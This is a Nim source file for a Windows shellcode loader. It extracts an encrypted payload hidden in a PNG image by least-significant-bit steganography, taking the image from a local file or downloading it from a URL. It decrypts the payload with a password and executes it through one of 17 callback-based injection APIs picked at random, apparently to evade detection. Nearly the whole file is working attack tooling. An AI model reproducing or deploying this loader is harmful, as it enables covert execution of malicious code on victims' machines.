#[
    Author: StudyCat
    Blog: https://www.cnblogs.com/studycat
    Github: https://github.com/StudyCat404/myNimExamples

    References:
        - https://github.com/S3cur3Th1sSh1t/Nim_CBT_Shellcode
        - https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection
        - https://github.com/treeform/steganography
        - https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim
]#
import shellcodeCallback
import lsb
import random
import os
import httpclient
import strutils

proc help() =
    let pathSplit = splitPath(paramStr(0))
    echo "Usage:"
    echo pathSplit.tail, " filename/url password"
    echo pathSplit.tail, " https://www.test.com/logo.png 12345678"
    echo pathSplit.tail, " logo.png 12345678"    

proc main(imgFile,password: string) =
    randomize()
    var 
        shellcode: seq[byte]
        mypng: Image
        enctext: string
        content: string

    try:        
        if fileExists(imgFile):
            mypng = loadImage(readFile(imgFile))
            enctext = decodeMessage(mypng)
            shellcode = decrypt(enctext, password)
        else:
            var client = newHttpClient()
            content = getContent(client, imgFile)
            mypng = loadImage(content)
            enctext = decodeMessage(mypng)
            shellcode = decrypt(enctext, password)    
    except:
        echo getCurrentException().msg
        quit()
            

    case rand(1..17)
    of 1:
        doEnumSystemGeoID(shellcode)
    of 2:
        doCertEnumSystemStore(shellcode)
    of 3:
        doCertEnumSystemStoreLocation(shellcode)
    of 4:
        doCopy2(shellcode)
    of 5:
        doCopyFileExW(shellcode)
    of 6:
        doEnumChildWindows(shellcode)
    of 7:
        doEnumDesktopWindows(shellcode)
    of 8:
        doEnumPageFilesW(shellcode)
    of 9:
        doImageGetDigestStream(shellcode)
    of 10:
        doEnumDateFormatsA(shellcode)
    of 11:
        doEnumSystemCodePagesA(shellcode)
    of 12:
        doEnumSystemLanguageGroupsA(shellcode)
    of 13:
        doEnumSystemLocalesA(shellcode)
    of 14:
        doEnumThreadWindows(shellcode)
    of 15:
        doEnumWindows(shellcode)
    of 16:
        doEnumUILanguagesA(shellcode)
    of 17:
        doSymEnumProcesses(shellcode)
    else:
        echo "unknown command"
    
when isMainModule:
    when defined(windows):
        if paramCount() > 0:
            var p1 = paramStr(1)
            if paramCount() < 2 or p1 in ["/?","-h","--help"]:
                help()
            else:
                if fileExists(p1.toLowerAscii()) or p1.toLowerAscii().startsWith("http://") or p1.toLowerAscii().startsWith("https://"):
                    main(paramStr(1), paramStr(2))
                else:
                    help()
        else:
            help()